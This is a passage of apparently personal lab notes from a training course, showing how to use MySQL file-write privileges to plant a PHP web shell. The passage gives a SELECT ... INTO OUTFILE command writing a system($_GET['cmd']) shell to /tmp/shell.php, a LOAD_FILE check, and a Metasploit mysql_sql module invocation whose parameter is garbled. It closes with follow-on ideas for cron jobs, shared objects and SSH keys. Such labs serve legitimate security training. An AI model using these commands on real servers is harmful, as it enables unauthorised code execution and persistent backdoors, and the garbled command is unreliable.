4. Upload file

As we can see /tmp & /root folder is writeable, we going to write a php script and save in shell.php file

![Content Image](https://assets.ine.com/lab/learningpath/7bcbfa099222dca93f6d605df2f25df2e84c3b18708ba78736779011861fa4e4.jpg)

1.  **Using `SELECT ... INTO OUTFILE`**  
	- From MySQL, you can try:
```
		SELECT '<?php system($_GET["cmd"]); ?>'
        INTO OUTFILE '/tmp/shell.php';
```

- Verify the file is saved or not in /tmp folder:

```
 select LOAD_FILE('/tmp/shell.php')
```
   
![[Pasted image 20250829101743.png]]

2. **Using Metasploit’s `mysql_sql` module**  
	In your Metasploit console:
	
```
use auxiliary/admin/mysql/mysql_sql
set SQL "SELECT '<?php system($_GET["rony=cmd"]); ?>' INTO OUTFILE '/tmp/shell.php'"
run
```


![[Pasted image 20250829102049.png]]

If /tmp is not web-accessible

- The file is still there, but you can’t call it via browser.
- You could still abuse /tmp for:
- Dropping malicious cron jobs
- Planting an .so shared object (library)
- Uploading an SSH key (if you had shell access)
